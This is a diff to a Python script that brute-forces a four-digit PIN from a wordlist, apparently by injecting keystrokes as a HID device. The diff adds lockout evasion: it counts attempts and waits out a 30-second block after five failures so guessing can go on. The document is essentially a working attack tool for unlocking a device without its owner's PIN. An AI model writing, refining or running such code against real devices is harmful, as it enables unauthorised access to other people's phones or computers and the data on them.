@@ -1,7 +1,13 @@
 #!/usr/bin/env python3
 
 import time
+
 pin = 4
+time_block = 30
+attempt = 0
+max_attempt = 5
+scdmax_attempt = 1
+
 counter = 0
 NULL_CHAR = chr(0)
 values = {
@@ -117,8 +123,17 @@ def read_wordlist(txt):
     	Lines = file.readlines()
     return Lines
 
-
-for i  in read_wordlist("wordlist_pin4.txt"):
+def attempt_maxed():
+    if attempt == max_attempt:
+     time.sleep(time_block+0.2)
+    if attempt >= max_attempt + scdmax_attempt:
+     time.sleep(time_block+0.2)
+    exec(values["_"])
+    time.sleep(1)
+    exec(values["_"])
+    time.sleep(1)
+for i in read_wordlist("wordlist_pin4.txt"):
+    attempt_maxed()
     print(i)
     counter = 0
     time.sleep(0.5)
@@ -126,9 +141,9 @@ for i  in read_wordlist("wordlist_pin4.txt"):
       time.sleep(0.2)
       print(letter)
       if counter != pin:
-        print(values[letter])
         exec(values[letter])
         counter += 1
       if counter == pin:
-        exec(values['$'])
+        exec(values['_'])
+    attempt += 1
 
